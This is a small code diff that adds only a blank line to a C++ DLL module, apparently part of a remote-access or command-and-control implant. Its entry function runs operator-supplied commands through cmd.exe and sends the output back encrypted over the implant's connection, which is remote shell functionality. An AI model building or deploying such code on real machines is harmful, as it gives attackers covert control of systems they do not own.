@@ -73,6 +73,7 @@ std::string ReadFromPipe()
 extern "C" __declspec(dllexport) ULONG ModuleEntrypoint(MODULE_CONTEXT ctx) {
 	OUTPUT response = { 0 };
 	std::string _stdout = command_execute("cmd.exe /c " + ctx.argv.at(0));
+
     response.output_length = _stdout.length();
 	memcpy(response.output, _stdout.data(), _stdout.length());
 	ctx.send_encrypted(ctx.aes_key, ctx.iv_key, ctx.connection, (char*)&response, sizeof(response));
